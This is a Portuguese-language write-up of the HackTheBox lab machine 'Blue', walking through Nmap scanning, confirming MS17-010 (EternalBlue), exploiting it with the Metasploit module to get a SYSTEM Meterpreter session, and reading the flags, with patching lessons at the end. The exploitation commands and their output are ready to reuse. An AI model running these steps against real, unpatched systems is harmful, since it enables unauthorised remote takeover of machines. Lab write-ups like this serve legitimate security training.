---
title: "HackTheBox 'Blue' — Explorando o EternalBlue (MS17-010)"
description: "Resolução completa da máquina Blue do HackTheBox: enumeração com Nmap, identificação da CVE-2017-0144 (EternalBlue) e exploração via Metasploit para obter shell SYSTEM."
pubDate: 2026-08-10
category: "Machine Write-ups"
tags: ["HackTheBox", "Windows", "EternalBlue", "Metasploit", "SMB"]
---

## Introdução

A máquina **Blue** do HackTheBox é um clássico absoluto — provavelmente a box mais resolvida da plataforma. O objetivo é simples: explorar um Windows 7 desatualizado rodando SMBv1 e capturar as flags de usuário e root. O vetor é o **EternalBlue**, um exploit vazado da NSA que ficou famoso pelo ransomware WannaCry em 2017.

---

## 1. Reconhecimento

### Scan de Portas

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.40
```

```text
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp open  tcpwrapped
```

Windows 7 SP1 com SMB exposto na porta 445. Versão antiga + SMB = sinal de alerta imediato.

---

## 2. Identificação da Vulnerabilidade

Rodamos o script de detecção específico do Nmap para confirmar:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
```

Vulnerabilidade confirmada. A **CVE-2017-0144 (EternalBlue)** explora uma falha de buffer overflow no protocolo SMBv1, permitindo execução remota de código sem autenticação. Severidade CVSS 8.1 — Crítica.

---

## 3. Exploração com Metasploit

O Metasploit tem um módulo maduro e estável para esse exploit:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
run
```

```text
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Shell de **SYSTEM** obtido diretamente — sem precisar de escalonamento de privilégio.

---

## 4. Pós-Exploração

Com SYSTEM, a leitura das flags é trivial:

```bash
cat C:\Users\haris\Desktop\user.txt
cat C:\Users\Administrator\Desktop\root.txt
```

---

## Lições Aprendidas

- **Patch management é crítico.** O MS17-010 foi corrigido em março de 2017. Máquinas sem atualização continuam vulneráveis anos depois — e ainda aparecem em ambientes corporativos reais.
- **Desabilitar SMBv1** elimina toda essa classe de ataques. Não há motivo para mantê-lo ativo em 2024+.
- O EternalBlue é um lembrete de que exploits vazados de agências de inteligência têm impacto real e duradouro no mundo.

---

## Flags

| Flag | Localização |
|------|-------------|
| user.txt | `C:\Users\haris\Desktop\user.txt` |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` |
